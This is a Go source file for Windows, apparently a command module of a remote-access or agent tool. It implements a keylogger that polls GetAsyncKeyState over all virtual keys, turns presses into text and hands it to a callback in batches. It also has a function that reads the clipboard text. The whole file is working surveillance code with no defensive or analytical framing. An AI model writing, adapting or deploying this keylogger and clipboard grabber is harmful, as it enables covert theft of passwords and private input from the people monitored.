//go:build windows

package commands

import (
	"context"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	user32GetAsyncKeyState = syscall.NewLazyDLL("user32.dll").NewProc("GetAsyncKeyState")
	user32GetKeyState      = syscall.NewLazyDLL("user32.dll").NewProc("GetKeyState")
	user32ToUnicode        = syscall.NewLazyDLL("user32.dll").NewProc("ToUnicode")
)

// vkNames maps interesting virtual key codes to printable labels.
var vkNames = map[int]string{
	0x08: "[backspace]", 0x09: "[tab]", 0x0D: "\n", 0x1B: "[esc]",
	0x20: " ", 0x21: "[pgup]", 0x22: "[pgdn]", 0x25: "[left]", 0x26: "[up]",
	0x27: "[right]", 0x28: "[down]", 0x2C: "[prtsc]", 0x2D: "[ins]", 0x2E: "[del]",
	0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]", 0x74: "[F5]",
	0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]", 0x78: "[F9]", 0x79: "[F10]",
	0x7A: "[F11]", 0x7B: "[F12]",
}

// keylogStart polls GetAsyncKeyState until ctx is cancelled, reporting each
// key-down as a character (or [label]) through the callback.
func keylogStart(ctx context.Context, intervalMS int, onEvent func(string)) error {
	interval := time.Duration(intervalMS) * time.Millisecond
	prev := map[int]bool{}
	var buf []byte
	for {
		select {
		case <-ctx.Done():
			if len(buf) > 0 {
				onEvent(string(buf))
			}
			return nil
		default:
		}
		for vk := 0x08; vk <= 0xFE; vk++ {
			r1, _, _ := user32GetAsyncKeyState.Call(uintptr(vk))
			pressed := r1&0x8000 != 0
			if pressed && !prev[vk] {
				if ch := vkChar(vk); ch != "" {
					buf = append(buf, []byte(ch)...)
				}
			}
			prev[vk] = pressed
		}
		// Flush accumulated characters to avoid unbounded memory growth.
		if len(buf) >= 128 {
			onEvent(string(buf))
			buf = nil
		}
		time.Sleep(interval)
	}
}

// vkChar maps a virtual key to its printable representation, honouring shift.
func vkChar(vk int) string {
	if s, ok := vkNames[vk]; ok {
		return s
	}
	if vk >= 'A' && vk <= 'Z' {
		shift, _, _ := user32GetKeyState.Call(0x10) // VK_SHIFT
		capLock, _, _ := user32GetKeyState.Call(0x14)
		caps := capLock&0x0001 != 0
		shifted := shift&0x8000 != 0 || shift&0x0001 != 0
		if shifted != caps {
			return string(rune(vk))
		}
		return string(rune(vk + 32))
	}
	if vk >= '0' && vk <= '9' {
		shift, _, _ := user32GetKeyState.Call(0x10)
		if shift&0x8000 != 0 {
			syms := []string{")", "!", "@", "#", "$", "%", "^", "&", "*", "("}
			return syms[vk-'0']
		}
		return string(rune(vk))
	}
	// Other printable keys via ToUnicode (uses the active keyboard layout).
	shift, _, _ := user32GetKeyState.Call(0x10)
	ctrl, _, _ := user32GetKeyState.Call(0x11)
	keyState := [256]byte{}
	keyState[0x10] = byte(shift >> 8)
	keyState[0x11] = byte(ctrl >> 8)
	keyState[0x14] = 1 // caps lock state is ignored for this path
	var out [4]uint16
	r1, _, _ := user32ToUnicode.Call(uintptr(vk), 0, uintptr(unsafe.Pointer(&keyState[0])), uintptr(unsafe.Pointer(&out[0])), 4, 0)
	if r1 > 0 {
		return string(rune(out[0]))
	}
	return ""
}

// clipboardRead returns the current clipboard text.
func clipboardRead() (string, error) {
	user32 := syscall.NewLazyDLL("user32.dll")
	open := user32.NewProc("OpenClipboard")
	close := user32.NewProc("CloseClipboard")
	getData := user32.NewProc("GetClipboardData")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	globalLock := kernel32.NewProc("GlobalLock")
	globalUnlock := kernel32.NewProc("GlobalUnlock")
	globalSize := kernel32.NewProc("GlobalSize")

	r1, _, _ := open.Call(0)
	if r1 == 0 {
		return "", syscall.EINVAL
	}
	defer close.Call()

	// CF_UNICODETEXT = 13
	h, _, _ := getData.Call(13)
	if h == 0 {
		return "", nil
	}
	sz, _, _ := globalSize.Call(h)
	if sz == 0 {
		return "", nil
	}
	ptr, _, _ := globalLock.Call(h)
	if ptr == 0 {
		return "", nil
	}
	defer globalUnlock.Call(h)

	// Treat as UTF-16LE, clamp to the reported size.
	raw := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), sz)
	text := utf16ToString(raw)
	return text, nil
}

// utf16ToString converts UTF-16LE bytes to a Go string (terminating at NUL).
func utf16ToString(raw []byte) string {
	u16 := make([]uint16, 0, len(raw)/2)
	for i := 0; i+1 < len(raw); i += 2 {
		c := uint16(raw[i]) | uint16(raw[i+1])<<8
		if c == 0 {
			break
		}
		u16 = append(u16, c)
	}
	return string(utf16.Decode(u16))
}
